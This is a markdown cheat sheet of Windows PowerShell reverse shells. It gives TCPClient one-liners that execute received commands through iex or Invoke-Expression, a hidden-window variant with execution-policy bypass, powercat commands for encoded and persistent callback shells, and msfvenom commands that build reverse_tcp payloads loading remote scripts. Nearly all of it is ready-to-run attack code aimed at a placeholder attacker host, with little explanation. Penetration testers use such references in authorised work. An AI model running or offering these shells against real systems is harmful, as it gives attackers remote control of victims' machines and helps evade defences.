# Powershell

## 01 - Regular

```powershell
PS C:\> $client = New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()

C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP>", <PORT>);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush()}; $client.Close()
```

## 02 - .NET

```powershell
PS C:\> $client = [System.Net.Sockets.TcpClient]::new("<IP>", "<PORT>"); $stream = $client.GetStream(); $reader = [System.IO.StreamReader]::new($stream); $writer = [System.IO.StreamWriter]::new($stream); while ($client.Connected) { while ($stream.DataAvailable) { $command = $reader.ReadLine(); $output = (Invoke-Expression $command) 2>&1 | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); } }
```

## 03 - Generate via `powercat`

Generate reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -g
```

Generate base64 encoded reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -ge
```

Persist callback shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -rep
```

## 04 - Generate via `msfvenom`

### 4.1 - x86 (32-bit) Payloads

```
$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o implant.bat
```

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1

$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
```

### 4.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x64.ps1
```

---
## References

- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

- [Powercat](https://github.com/besimorhino/powercat)

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)

- [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)